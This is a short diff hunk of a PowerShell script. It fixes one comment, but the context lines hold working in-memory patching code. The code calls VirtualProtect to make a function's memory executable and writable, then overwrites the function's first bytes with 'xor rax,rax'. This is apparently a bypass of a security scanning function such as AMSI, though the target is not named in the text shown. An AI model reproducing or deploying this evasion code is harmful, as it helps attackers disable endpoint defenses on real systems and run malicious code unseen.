@@ -39,7 +39,7 @@ if([System.IntPtr]::Size -eq 4){
     $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
     $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
     $xorrax = [Byte[]] (0x48,0x31,0xC0)
-    # xor eax,eax
+    # xor rax,rax
     [System.Runtime.InteropServices.Marshal]::WriteByte($funcAddr,0,$xorrax[0])
     [System.Runtime.InteropServices.Marshal]::WriteByte($funcAddr,1,$xorrax[1])
     [System.Runtime.InteropServices.Marshal]::WriteByte($funcAddr,2,$xorrax[2])
